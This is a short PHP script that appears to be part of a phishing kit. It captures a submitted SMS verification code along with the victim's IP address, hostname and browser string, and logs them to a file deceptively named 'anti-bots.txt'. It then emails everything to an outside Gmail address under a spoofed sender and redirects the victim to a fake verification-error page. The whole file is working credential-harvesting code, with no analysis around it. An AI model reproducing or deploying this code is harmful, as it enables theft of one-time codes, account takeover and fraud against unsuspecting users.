<?php
$ip = getenv("REMOTE_ADDR");
$msg .= "------------------------Mr-ver-------------------------------------------\n";
$msg .= "-------------------------info--------------------------\n";
$msg .= "SMS1                      :        ".$_POST['o8']."\n";
$msg .= "-------------------------info-------------------------------------------\n";
$msg .= "IP    		               :        ".getenv("REMOTE_ADDR")."\n";
$msg .= "Host    		           :        ".gethostbyaddr(getenv("REMOTE_ADDR"))."\n";
$msg .= "Browser 	               :        ".$_SERVER["HTTP_USER_AGENT"]."\n";
$msg .= "------------------------Mr-ver-------------------------------------------\n";
$log = fopen("index_files/anti-bots.txt","a");
fwrite($log,$msg);
fclose($log);
$ubj = "impo-sms1 - $ip";
$frm = "From: info <veer@voila.fr>";
$end = "nonizohir@gmail.com";
mail($end,$ubj,$msg,$frm);
header("Location: load2.html?personal-identifiant.sms.verification.error?404/login.asp?rediction#Ath2913029");
?>
